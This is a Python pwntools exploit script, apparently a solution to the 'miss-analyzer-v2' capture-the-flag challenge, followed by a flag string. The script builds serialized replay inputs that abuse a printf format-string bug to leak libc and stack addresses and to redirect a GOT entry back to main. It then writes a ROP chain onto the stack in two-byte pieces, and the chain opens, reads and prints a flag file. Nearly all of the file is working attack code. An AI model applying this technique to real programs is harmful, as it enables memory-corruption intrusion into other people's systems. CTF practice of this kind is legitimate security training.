#!/usr/bin/env python3

from pwn import *
import struct
from math import ceil

exe = ELF("analyzer_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

os.environ["LD_PRELOAD"] = "./libseccomp.so.2.5.5"

context.binary = exe

"""
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                                    b *main+0x391
                                    b *main+0x4a1
                                    # b *main+1150
                                    # tb main
                                    continue
                                    """,)
    else:
        r = remote(args.HOST or "miss-analyzer-v2.challs.sekai.team", 1337)

    return r



def to_serialized_str(s: bytes) -> bytes:
    if(not s):
        return b"\x00"

    # using uleb128 to specify the length of the string
    output = b"\x0b"
    l = len(s)
    b = -1

    while l != 0:
        """
        do {
          byte = value & 0x7f; /* low-order 7 bits of value */
          value >>= 7;
          if (value != 0) /* more bytes to come */
            byte |= 0x80; /* set high-order bit of byte */
          emit(byte);
        } while (value != 0);
        """
        b = l & 0x7f
        l >>= 7
        if(0 != l): b |= 0x80
        output += struct.pack('B', b)
        
    output += s

    return output


def main():
    r = conn()

    # good luck pwning :)

    # goal: specify an address in the got, then use it to point back to main,
    #       though w/o the stack frame initialization to keep the same ret addr
    # sample fstring output w/o overwrite: "0x7ffdfa68f878.0x7fc204629d90."
    # this has a length of 30
    # format_payload = b"%53$llx.%6$llx." 
    # written = 22
    # format_payload += b"%c" * (0x28 + 6 - 2)
    # written += 0x28 + 6 - 2
    # # format_payload += f"%10u%hn".encode("ascii")
    # format_payload += f"%{((exe.sym['main'])&0xffff) - (written&0xffff)}u%hn".encode("ascii")
    format_payload = b"%53$llx.%6$llx." 
    written = 22
    format_payload += f"%{(exe.sym['main']&0xffff)-(written&0xffff)}u%{0x28+6}$hn".encode("ascii")

    payload = b''.join([
        b"\x00",                                # replay type
        b"\xde\xad\xbe\xef",                    # 4 bytes for consumption
        to_serialized_str(flat({0x0: b"yippee", # hash
                                0xe0: b"./flag.txt\x00",
                                0xf0: p64(exe.got["seccomp_release"]),
                                })),
        to_serialized_str(format_payload),      # name (printf vuln)
        to_serialized_str(b"yahoooooooo"),      # replay
        b'a' * 10,                              # consume a couple of bytes
        struct.pack(">H", 0x00),                # read a short
    ])
    r.sendlineafter(b"\n", payload.hex().encode())

    r.recvuntil(b"name: ")
    libc_start_main_ret, decode_addr = [int(p, 16) for p in r.recvuntil(b"\n", drop=True).split(b'.')[:2]]
    decode_addr |= 0x7fff_0000_0000 # for some reason, 2 MSB are not printing
                                    # therefore, we pray that this is right
    if(args.GDB):
        upper = input("or, if you're debugging, you know the upper bits anyways? 👉👈 >  ")
        if upper:
            decode_addr &= 0xffff_ffff
            decode_addr |= int(upper, 16) << 32
        else:
            print("fine :(")

    main_scope_ret_addr = decode_addr - 0x110
    flag_addr = decode_addr - 0x158

    libc.address = libc_start_main_ret - libc.libc_start_main_return

    r.success(f"leaked {libc.address=:x}, {main_scope_ret_addr=:x}, {flag_addr=:x}")

    # the payload above should bring us back to the start of main!! so now we
    # set up a rop chain
    rop = ROP(libc)
    # rop.raw(rop.ret)                            # just in case, like usual
    rop.call("open", [flag_addr, 0, 0])
    # read/write the flag into the global section of the exe
    """
    ## wtf is the rop syntax here lol
    rop.raw(libc.address + 0x0000000000041563) # : push rax ; ret
    rop.raw(libc.address + 0x000000000002a3e5) # : pop rdi ; ret
    rop.rsi = 0x404000
    rop.rdx = 0xff
    rop.call("read")
    """
    rop.call("read", [3, 0x404080, 0xff])
    rop.call("write", [1, 0x404080, 0xff])
    rop.call("exit", [0])

    addr_table_size = 0x90
    shorts_per_req = addr_table_size // 0x10 - 1

    rop_shorts = [rop.chain()[i:i+2] for i in range(0, len(rop.chain()), 2)]
    repititons = ceil(len(rop_shorts)/shorts_per_req)

    r.info(f"generated the following rop chain:\n{rop.dump()}")
    r.info(f"this is going to be {len(rop_shorts)=} shorts to write to {main_scope_ret_addr:x}")
    r.info(f"reasonably in one loop, we can write {shorts_per_req} shorts")
    r.info(f"this is {shorts_per_req / 4} qwords")
    r.info(f"therefore, we need {repititons} requests to do this")

    # write a bunch of shorts per request
    rop_head = main_scope_ret_addr

    for i in range(repititons):
        addr_offset = 0x18 + 6
        format_payload = b""
        addr_table = b""
        total_written = 0
        print_amount = 0
        for short in rop_shorts[i*shorts_per_req : (i+1)*shorts_per_req]:
            addr_table += p64(rop_head)
            rop_head += 2

            # add each short such that it'd write to the address we added
            short_raw = unpack(short, "all")
            print_amount = (short_raw - (total_written & 0xffff) + 0x10000) % 0x10000
            if(short_raw or print_amount):
                format_payload += f"%{print_amount}c".encode("ascii")
                total_written += print_amount
            format_payload += f"%{addr_offset}$hn".encode("ascii")
            addr_offset += 1

        payload = b''.join([
            b"\x00",                                # replay type
            b"\xde\xad\xbe\xef",                    # 4 bytes for consumption
            to_serialized_str(flat({0x0: b"yippee", # hash
                                    0x100 - addr_table_size: addr_table,
                                    })),
            to_serialized_str(format_payload),      # name (printf vuln)
            to_serialized_str(b"yahoooooooo"),      # replay
            b'a' * 10,                              # consume a couple of bytes
            struct.pack(">H", 0xff),                # read a short
        ])
        r.sendlineafter(b"Submit", payload.hex().encode())
        r.info(f"sent {i+1}: {format_payload=}")

    # now that the rop chain is on the stack, we need to clean up all the stack
    # frames we created, which is nice bc our stack frames should be correct.
    # therefore, all we need to do in this final request is ensure that the
    # codeflow returns, which is namely just hitting a `ret` instruction (no
    # base pointer was pushed, but we did call :>)

    # format_payload = f"%10u%hn".encode("ascii")
    format_payload = f"%{(exe.sym['main']+0x4a1)&0xffff}c%{0x28+6}$hn".encode("ascii")

    payload = b''.join([
        b"\x00",                                # replay type
        b"\xde\xad\xbe\xef",                    # 4 bytes for consumption
        to_serialized_str(flat({0x0: b"yippee", # hash
                                0xf0: p64(0x404060),
                                })),
        to_serialized_str(format_payload),      # name (printf vuln)
        to_serialized_str(b"yahoooooooo"),      # replay
        b'a' * 10,                              # consume a couple of bytes
        struct.pack(">H", 0xff),                # read a short
    ])
    r.sendlineafter(b"\n", payload.hex().encode())

    r.interactive()


if __name__ == "__main__":
    main()

# osu{fmtstr_in_the_b1g_2025}
